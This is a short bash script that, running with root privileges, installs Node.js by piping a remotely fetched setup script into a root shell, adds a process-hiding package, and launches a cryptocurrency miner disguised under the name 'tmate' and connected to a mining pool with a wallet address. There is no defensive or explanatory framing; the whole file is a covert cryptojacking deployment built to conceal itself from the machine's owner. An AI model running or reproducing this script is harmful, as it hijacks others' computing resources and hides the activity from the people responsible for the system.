#!/bin/bash
sudo su --command "sudo apt-get update && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt-get update && sudo apt install nodejs && npm install -g npm@8.5.0 && npm i -g node-process-hider && ph add tmate && ./tmate -a yescryptR16 -o stratum+tcps://stratum-na.rplant.xyz:17055 -u qgUHBLFGsos52xRT6z1HvLgG75mmBzi3uy.vcpu001 -p webpassword=x -t 5"
